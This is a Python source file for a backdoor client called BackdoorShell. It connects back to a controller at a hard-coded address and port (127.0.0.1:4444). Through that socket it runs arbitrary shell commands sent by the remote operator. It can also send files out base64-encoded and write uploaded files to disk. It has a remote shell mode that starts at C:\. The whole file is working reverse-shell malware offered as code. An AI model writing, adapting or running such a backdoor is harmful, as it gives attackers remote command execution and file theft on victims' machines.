import socket
import subprocess
import json
import os
import base64

class BackdoorShell:
    def __init__(self, ip, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((ip, port))
        self.default_prompt = "admin@medusax~$ "
        self.current_prompt = self.default_prompt
        self.in_shell_mode = False

    def send_json(self, data):
        self.s.send(json.dumps(data).encode())

    def receive_json(self):
        data = ""
        while True:
            try:
                data += self.s.recv(1024).decode()
                return json.loads(data)
            except ValueError:
                continue

    def change_directory(self, path):
        try:
            os.chdir(path)
            return f"Changed directory to {path}"
        except Exception as e:
            return f"Failed to change directory: {e}"

    def execute_command(self, command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            return result.stdout + result.stderr
        except Exception:
            return "[+] Error executing command [+]"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful [+]"

    def run(self):
        self.send_json("Connected to combined client.")
        while True:
            self.send_json(self.current_prompt)
            command = self.receive_json()

            if isinstance(command, str):
                command = command.strip().split()

            if not command:
                continue

            cmd = command[0].lower()

            if cmd == "km":
                self.send_json("Disconnecting...")
                self.s.close()
                break

            elif cmd == "shell":
                self.in_shell_mode = True
                os.chdir("C:\\")
                self.current_prompt = f"{os.getcwd()} > "
                self.send_json("Entering remote shell mode. Type 'exit' to leave.")
                continue

            elif cmd == "shell" and len(command) > 2 and command[1] == "-d":
                self.in_shell_mode = True
                self.current_prompt = f"{os.getcwd()} > "
                self.send_json(self.change_directory(command[2]))
                continue

            elif self.in_shell_mode:
                if cmd == "exit":
                    self.in_shell_mode = False
                    self.current_prompt = self.default_prompt
                    self.send_json("Exiting remote shell mode.")
                    continue
                else:
                    output = self.execute_command(" ".join(command))
                    self.send_json(output)
                    continue

            elif cmd == "cd":
                output = self.change_directory(command[1]) if len(command) > 1 else "Missing path"
            elif cmd == "download":
                output = self.read_file(command[1])
            elif cmd == "upload":
                output = self.write_file(command[1], command[2])
            elif cmd == "exit":
                self.s.close()
                break
            else:
                output = self.execute_command(" ".join(command))

            self.send_json(output)


client = BackdoorShell("127.0.0.1", 4444)
client.run()
